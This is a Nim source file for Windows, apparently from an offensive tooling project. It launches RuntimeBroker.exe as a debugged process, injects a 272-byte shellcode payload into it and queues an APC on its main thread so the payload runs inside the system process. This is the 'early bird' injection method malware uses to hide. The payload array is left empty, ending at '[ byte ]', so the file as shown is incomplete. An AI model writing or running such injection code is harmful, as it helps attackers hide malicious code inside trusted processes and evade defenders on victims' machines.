import winim/lean
import std/strformat, os
import RemoteThreadHijack
import APCInjection


# Trying something here, think these could be useful in the future
func `==`*(a: BOOL, b: bool): bool =
    if a == FALSE and not b: true
    elif a == TRUE and b: true
    else: false

func `not`*(a: BOOL): bool =
    if a == FALSE: true
    else: false

proc createDebugProcess(processName: string): Process =
    var
        pi: PROCESS_INFORMATION
        si: STARTUPINFO
    
    si.cb = DWORD sizeof(STARTUPINFO)
    let cmdLine = winstrConverterStringToLPWSTR(&"""{getEnv("WINDIR")}\\system32\\{processName}""")

    if not CreateProcess(nil, cmdLine, nil, nil, FALSE, DEBUG_PROCESS, nil, nil, addr si, addr pi):
        echo "[!] - CreateProcess failed: ", GetLastError()
        return

    result.hProcess = pi.hProcess
    result.hThread = pi.hThread
    result.pid = pi.dwProcessId


if isMainModule:
    const payload: array[272, byte] = [
        byte ] 
    let process = createDebugProcess("RuntimeBroker.exe")
    echo "[+] - Created debug process: ", process.pid
    let payloadAddr = process.injectShellcode(payload)
    process.hThread.queueAPC(payloadAddr)
    echo "[+] - Injected APC into remote process, press <enter> to stop debugger..."
    discard readLine(stdin)
    if not DebugActiveProcessStop(DWORD process.pid):
        echo "[!] - DebugActiveProcessStop failed: ", GetLastError()
    echo "[+] - Debugger stopped"
    discard readLine(stdin)
    